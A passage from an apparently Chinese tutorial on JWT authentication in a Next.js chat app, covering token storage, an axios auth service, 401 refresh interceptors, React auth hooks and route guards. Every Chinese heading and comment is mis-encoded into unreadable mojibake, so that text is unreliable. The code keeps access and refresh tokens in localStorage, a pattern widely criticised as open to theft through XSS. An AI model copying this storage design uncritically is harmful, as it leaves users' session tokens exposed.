<span class="hljs-number">401</span> <span class="hljs-string">Unauthorized</span>
   <span class="hljs-string">â†“</span>
<span class="hljs-string">è‡ªåŠ¨åˆ·æ–°Token</span>
   <span class="hljs-string">â†“</span>
<span class="hljs-string">Refresh</span> <span class="hljs-string">Tokenæœ‰æ•ˆ?</span> <span class="hljs-string">â”€Yesâ†’</span> <span class="hljs-string">è·å–æ–°Access</span> <span class="hljs-string">Token</span> <span class="hljs-string">â†’</span> <span class="hljs-string">é‡è¯•è¯·æ±‚</span>
   <span class="hljs-string">â†“</span> <span class="hljs-literal">No</span>
<span class="hljs-string">è·³è½¬ç™»å½•é¡µ</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€è®¤è¯æœåŠ¡å®ç°</h3>
<h4 data-id="heading-9">3.1 Tokenç®¡ç†</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// lib/token-manager.ts</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ACCESS_TOKEN_KEY</span> = <span class="hljs-string">'access_token'</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">REFRESH_TOKEN_KEY</span> = <span class="hljs-string">'refresh_token'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenManager</span> {
  <span class="hljs-comment">// å­˜å‚¨Token</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">setTokens</span>(<span class="hljs-attr">accessToken</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">refreshToken</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> === <span class="hljs-string">'undefined'</span>) <span class="hljs-keyword">return</span>
    
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-variable constant_">ACCESS_TOKEN_KEY</span>, accessToken)
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-variable constant_">REFRESH_TOKEN_KEY</span>, refreshToken)
  }

  <span class="hljs-comment">// è·å–Access Token</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getAccessToken</span>(): <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> === <span class="hljs-string">'undefined'</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-variable constant_">ACCESS_TOKEN_KEY</span>)
  }

  <span class="hljs-comment">// è·å–Refresh Token</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getRefreshToken</span>(): <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> === <span class="hljs-string">'undefined'</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-variable constant_">REFRESH_TOKEN_KEY</span>)
  }

  <span class="hljs-comment">// æ¸…é™¤Token</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">clearTokens</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> === <span class="hljs-string">'undefined'</span>) <span class="hljs-keyword">return</span>
    
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-variable constant_">ACCESS_TOKEN_KEY</span>)
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-variable constant_">REFRESH_TOKEN_KEY</span>)
  }

  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²è®¤è¯</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">isAuthenticated</span>(): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">return</span> !!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAccessToken</span>()
  }

  <span class="hljs-comment">// è§£æToken</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">parseToken</span>(<span class="hljs-attr">token</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">any</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> base64Url = token.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>)[<span class="hljs-number">1</span>]
      <span class="hljs-keyword">const</span> base64 = base64Url.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/-/g</span>, <span class="hljs-string">'+'</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/_/g</span>, <span class="hljs-string">'/'</span>)
      <span class="hljs-keyword">const</span> jsonPayload = <span class="hljs-built_in">decodeURIComponent</span>(
        <span class="hljs-title function_">atob</span>(base64)
          .<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>)
          .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> <span class="hljs-string">'%'</span> + (<span class="hljs-string">'00'</span> + c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>)).<span class="hljs-title function_">slice</span>(-<span class="hljs-number">2</span>))
          .<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>)
      )
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonPayload)
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    }
  }

  <span class="hljs-comment">// æ£€æŸ¥Tokenæ˜¯å¦è¿‡æœŸ</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">isTokenExpired</span>(<span class="hljs-attr">token</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> payload = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">parseToken</span>(token)
    <span class="hljs-keyword">if</span> (!payload || !payload.<span class="hljs-property">exp</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &gt;= payload.<span class="hljs-property">exp</span> * <span class="hljs-number">1000</span>
  }
}
</code></pre>
<h4 data-id="heading-10">3.2 è®¤è¯APIæœåŠ¡</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// services/auth.service.ts</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TokenManager</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/lib/token-manager'</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_URL</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">NEXT_PUBLIC_API_URL</span> || <span class="hljs-string">'http://localhost:8000'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LoginCredentials</span> {
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">password</span>: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RegisterData</span> {
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">password</span>: <span class="hljs-built_in">string</span>
  full_name?: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>
  full_name?: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LoginResponse</span> {
  <span class="hljs-attr">access_token</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">refresh_token</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthService</span> {
  <span class="hljs-comment">// ç™»å½•</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">login</span>(<span class="hljs-attr">credentials</span>: <span class="hljs-title class_">LoginCredentials</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">LoginResponse</span>&gt; {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/auth/login`</span>, credentials)
    <span class="hljs-keyword">const</span> data = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>

    <span class="hljs-comment">// å­˜å‚¨Token</span>
    <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">setTokens</span>(data.<span class="hljs-property">access_token</span>, data.<span class="hljs-property">refresh_token</span>)

    <span class="hljs-keyword">return</span> data
  }

  <span class="hljs-comment">// æ³¨å†Œ</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">register</span>(<span class="hljs-attr">data</span>: <span class="hljs-title class_">RegisterData</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">User</span>&gt; {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/auth/register`</span>, data)
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>
  }

  <span class="hljs-comment">// è·å–å½“å‰ç”¨æˆ·</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getCurrentUser</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">User</span>&gt; {
    <span class="hljs-keyword">const</span> token = <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">getAccessToken</span>()
    <span class="hljs-keyword">if</span> (!token) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æœªç™»å½•'</span>)
    }

    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/auth/me`</span>, {
      <span class="hljs-attr">headers</span>: {
        <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>
      }
    })

    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>
  }

  <span class="hljs-comment">// åˆ·æ–°Token</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">refreshToken</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
    <span class="hljs-keyword">const</span> refreshToken = <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">getRefreshToken</span>()
    <span class="hljs-keyword">if</span> (!refreshToken) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æ— Refresh Token'</span>)
    }

    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/auth/refresh`</span>, {
      <span class="hljs-attr">refresh_token</span>: refreshToken
    })

    <span class="hljs-keyword">const</span> newAccessToken = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">access_token</span>
    <span class="hljs-keyword">const</span> newRefreshToken = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>.<span class="hljs-property">refresh_token</span>

    <span class="hljs-comment">// æ›´æ–°Token</span>
    <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">setTokens</span>(newAccessToken, newRefreshToken)

    <span class="hljs-keyword">return</span> newAccessToken
  }

  <span class="hljs-comment">// ç™»å‡º</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">logout</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> token = <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">getAccessToken</span>()
      <span class="hljs-keyword">if</span> (token) {
        <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(
          <span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/auth/logout`</span>,
          {},
          {
            <span class="hljs-attr">headers</span>: {
              <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>
            }
          }
        )
      }
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">clearTokens</span>()
    }
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> authService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AuthService</span>()
</code></pre>
<hr/>
<h3 data-id="heading-11">å››ã€Axiosæ‹¦æˆªå™¨</h3>
<h4 data-id="heading-12">4.1 è¯·æ±‚æ‹¦æˆªå™¨</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// lib/axios-instance.ts</span>
<span class="hljs-keyword">import</span> axios, { <span class="hljs-title class_">AxiosInstance</span>, <span class="hljs-title class_">AxiosError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TokenManager</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./token-manager'</span>
<span class="hljs-keyword">import</span> { authService } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/services/auth.service'</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_URL</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">NEXT_PUBLIC_API_URL</span> || <span class="hljs-string">'http://localhost:8000'</span>

<span class="hljs-comment">// åˆ›å»ºAxioså®ä¾‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">axiosInstance</span>: <span class="hljs-title class_">AxiosInstance</span> = axios.<span class="hljs-title function_">create</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-variable constant_">API_URL</span>,
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">30000</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
  }
})

<span class="hljs-comment">// è¯·æ±‚æ‹¦æˆªå™¨</span>
axiosInstance.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> token = <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">getAccessToken</span>()
    <span class="hljs-keyword">if</span> (token) {
      config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>
    }
    <span class="hljs-keyword">return</span> config
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
  }
)

<span class="hljs-comment">// å“åº”æ‹¦æˆªå™¨</span>
<span class="hljs-keyword">let</span> isRefreshing = <span class="hljs-literal">false</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">failedQueue</span>: <span class="hljs-built_in">any</span>[] = []

<span class="hljs-keyword">const</span> <span class="hljs-title function_">processQueue</span> = (<span class="hljs-params">error: <span class="hljs-built_in">any</span>, token: <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span></span>) =&gt; {
  failedQueue.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">prom</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (error) {
      prom.<span class="hljs-title function_">reject</span>(error)
    } <span class="hljs-keyword">else</span> {
      prom.<span class="hljs-title function_">resolve</span>(token)
    }
  })

  failedQueue = []
}

axiosInstance.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> response,
  <span class="hljs-keyword">async</span> (<span class="hljs-attr">error</span>: <span class="hljs-title class_">AxiosError</span>) =&gt; {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">originalRequest</span>: <span class="hljs-built_in">any</span> = error.<span class="hljs-property">config</span>

    <span class="hljs-comment">// 401é”™è¯¯ä¸”æœªé‡è¯•è¿‡</span>
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">response</span>?.<span class="hljs-property">status</span> === <span class="hljs-number">401</span> &amp;&amp; !originalRequest.<span class="hljs-property">_retry</span>) {
      <span class="hljs-keyword">if</span> (isRefreshing) {
        <span class="hljs-comment">// æ­£åœ¨åˆ·æ–°Tokenï¼Œå°†è¯·æ±‚åŠ å…¥é˜Ÿåˆ—</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
          failedQueue.<span class="hljs-title function_">push</span>({ resolve, reject })
        })
          .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">token</span> =&gt;</span> {
            originalRequest.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">axiosInstance</span>(originalRequest)
          })
          .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
      }

      originalRequest.<span class="hljs-property">_retry</span> = <span class="hljs-literal">true</span>
      isRefreshing = <span class="hljs-literal">true</span>

      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// åˆ·æ–°Token</span>
        <span class="hljs-keyword">const</span> newToken = <span class="hljs-keyword">await</span> authService.<span class="hljs-title function_">refreshToken</span>()
        
        <span class="hljs-comment">// æ›´æ–°åŸå§‹è¯·æ±‚çš„Token</span>
        originalRequest.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${newToken}</span>`</span>
        
        <span class="hljs-comment">// å¤„ç†é˜Ÿåˆ—ä¸­çš„è¯·æ±‚</span>
        <span class="hljs-title function_">processQueue</span>(<span class="hljs-literal">null</span>, newToken)
        
        <span class="hljs-comment">// é‡è¯•åŸå§‹è¯·æ±‚</span>
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">axiosInstance</span>(originalRequest)
      } <span class="hljs-keyword">catch</span> (refreshError) {
        <span class="hljs-comment">// åˆ·æ–°å¤±è´¥ï¼Œæ¸…é™¤Tokenå¹¶è·³è½¬ç™»å½•</span>
        <span class="hljs-title function_">processQueue</span>(refreshError, <span class="hljs-literal">null</span>)
        <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">clearTokens</span>()
        
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span>) {
          <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/login'</span>
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(refreshError)
      } <span class="hljs-keyword">finally</span> {
        isRefreshing = <span class="hljs-literal">false</span>
      }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
  }
)

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> axiosInstance
</code></pre>
<hr/>
<h3 data-id="heading-13">äº”ã€React Hooks</h3>
<h4 data-id="heading-14">5.1 useAuth Hook</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// hooks/useAuth.ts</span>
<span class="hljs-keyword">import</span> { useState, useEffect, useCallback } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>
<span class="hljs-keyword">import</span> { authService } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/services/auth.service'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">TokenManager</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/lib/token-manager'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">User</span>, <span class="hljs-title class_">LoginCredentials</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/services/auth.service'</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UseAuthReturn</span> {
  <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>
  <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">error</span>: <span class="hljs-title class_">Error</span> | <span class="hljs-literal">null</span>
  <span class="hljs-attr">login</span>: <span class="hljs-function">(<span class="hljs-params">credentials: LoginCredentials</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;
  <span class="hljs-attr">logout</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;
  <span class="hljs-attr">isAuthenticated</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useAuth</span>(<span class="hljs-params"/>): <span class="hljs-title class_">UseAuthReturn</span> {
  <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
  <span class="hljs-keyword">const</span> [user, setUser] = useState&lt;<span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>)
  <span class="hljs-keyword">const</span> [error, setError] = useState&lt;<span class="hljs-title class_">Error</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)

  <span class="hljs-comment">// æ£€æŸ¥è®¤è¯çŠ¶æ€</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">checkAuth</span>()
  }, [])

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkAuth</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">isAuthenticated</span>()) {
        <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>)
        <span class="hljs-keyword">return</span>
      }

      <span class="hljs-keyword">const</span> userData = <span class="hljs-keyword">await</span> authService.<span class="hljs-title function_">getCurrentUser</span>()
      <span class="hljs-title function_">setUser</span>(userData)
      <span class="hljs-title function_">setError</span>(<span class="hljs-literal">null</span>)
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-title function_">setError</span>(err <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>)
      <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">clearTokens</span>()
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>)
    }
  }

  <span class="hljs-keyword">const</span> login = <span class="hljs-title function_">useCallback</span>(<span class="hljs-keyword">async</span> (<span class="hljs-attr">credentials</span>: <span class="hljs-title class_">LoginCredentials</span>) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>)
      <span class="hljs-title function_">setError</span>(<span class="hljs-literal">null</span>)

      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> authService.<span class="hljs-title function_">login</span>(credentials)
      <span class="hljs-title function_">setUser</span>(response.<span class="hljs-property">user</span>)

      router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/chat'</span>)
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-title function_">setError</span>(err <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>)
      <span class="hljs-keyword">throw</span> err
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>)
    }
  }, [router])

  <span class="hljs-keyword">const</span> logout = <span class="hljs-title function_">useCallback</span>(<span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> authService.<span class="hljs-title function_">logout</span>()
      <span class="hljs-title function_">setUser</span>(<span class="hljs-literal">null</span>)
      router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>)
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-title function_">setError</span>(err <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>)
    }
  }, [router])

  <span class="hljs-keyword">return</span> {
    user,
    loading,
    error,
    login,
    logout,
    <span class="hljs-attr">isAuthenticated</span>: !!user
  }
}
</code></pre>
<h4 data-id="heading-15">5.2 useRequireAuth Hook</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// hooks/useRequireAuth.ts</span>
<span class="hljs-keyword">import</span> { useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>
<span class="hljs-keyword">import</span> { useAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useAuth'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useRequireAuth</span>(<span class="hljs-params">redirectTo = <span class="hljs-string">'/login'</span></span>) {
  <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
  <span class="hljs-keyword">const</span> { isAuthenticated, loading } = <span class="hljs-title function_">useAuth</span>()

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!loading &amp;&amp; !isAuthenticated) {
      router.<span class="hljs-title function_">push</span>(redirectTo)
    }
  }, [isAuthenticated, loading, router, redirectTo])

  <span class="hljs-keyword">return</span> { isAuthenticated, loading }
}
</code></pre>
<hr/>
<h3 data-id="heading-16">å…­ã€è·¯ç”±ä¿æŠ¤</h3>
<h4 data-id="heading-17">6.1 å®¢æˆ·ç«¯è·¯ç”±ä¿æŠ¤</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// app/chat/page.tsx</span>
<span class="hljs-string">'use client'</span>

<span class="hljs-keyword">import</span> { useRequireAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useRequireAuth'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { loading } = <span class="hljs-title function_">useRequireAuth</span>()

  <span class="hljs-keyword">if</span> (loading) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      {/* èŠå¤©ç•Œé¢ */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-18">6.2 é«˜é˜¶ç»„ä»¶ä¿æŠ¤</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// components/withAuth.tsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ComponentType</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { useRequireAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useRequireAuth'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> withAuth&lt;P <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span>&gt;(
  <span class="hljs-title class_">Component</span>: <span class="hljs-title class_">ComponentType</span>&lt;P&gt;
): <span class="hljs-title class_">ComponentType</span>&lt;P&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AuthenticatedComponent</span>(<span class="hljs-params">props: P</span>) {
    <span class="hljs-keyword">const</span> { loading } = <span class="hljs-title function_">useRequireAuth</span>()

    <span class="hljs-keyword">if</span> (loading) {
